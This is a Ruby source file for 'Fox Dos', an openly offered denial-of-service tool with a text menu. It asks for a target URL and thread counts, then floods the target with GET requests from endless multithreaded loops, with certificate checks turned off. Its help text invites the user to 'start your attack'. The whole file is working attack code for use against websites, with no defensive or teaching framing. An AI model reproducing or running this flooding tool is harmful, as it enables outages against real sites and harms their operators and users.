require 'net/http'
require 'uri'
require 'concurrent'
require 'cli/ui'

# Function to send a GET request
def send_request(url)
  http = Net::HTTP.new(url.host, url.port)

  # If the URL uses HTTPS, set use_ssl to true
  if url.scheme == 'https'
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  end
  request = Net::HTTP::Get.new(url)
  response = http.request(request)
end

# UI stuff
CLI::UI.frame_style = :bracket
CLI::UI::StdoutRouter.enable
CLI::UI::Frame.open('Fox Dos') do
  selected = nil
  CLI::UI::Prompt::ask('Select one action:') do |handler|
    handler.option('Dos')  { |selection| selected = selection }
    handler.option('DDos')  { |selection| selected = selection }
    handler.option('Help')  { |selection| selected = selection }
  end

  # Dos attack
  CLI::UI::Frame.divider(selected)
  case selected

  when 'Dos'
    # Define the target URL
    begin
      target = URI CLI::UI.ask('Target URL:', default: 'No Target!')
    rescue => e
      puts CLI::UI.fmt "{{red:#{e.message}}}"
    else
      # Number of threads to simulate multiple requests
      num_threads = CLI::UI.ask('Number of threads:', default: '10').to_i

      # Attack number
      attack_num = CLI::UI.ask('Number of attack:', default: '1').to_i

      # Create a thread pool
      pool = Concurrent::FixedThreadPool.new(num_threads)

      # Submit tasks to the thread pool
      for index in 1..attack_num do
        CLI::UI::Spinner.spin("#{index}: Sending packets to #{target}: {{@widget/status:1:2:3:4}}") do |spinner|
          num_threads.times do
            pool.post do
              loop do
                send_request(target)
                sleep 0.1 # Adjust the sleep interval as needed
              end
            end
          end
        end
      end
    end
  when 'DDos'
    puts CLI::UI.fmt "{{underline:The DDos mode is not ready.}}"
  when 'Help'

    CLI::UI::Frame.open('{{i}} About', color: :blue) do
      puts CLI::UI.fmt "{{green:Description}}"
      puts "This is a simple Dos and DDos tool made by Meisam Heidari with Ruby language."
      puts "Just Select one option then you can start your attack!\n\nGithub: https://github.com/Mr-Fox-h"
    end

    # Add More data in the help options

    CLI::UI::Frame.open('{{!}} Atention', color: :red) do
      puts "The DDos mode is not ready!"
    end
  else
    puts CLI::UI.fmt "{{red:Error!}}"
  end
end
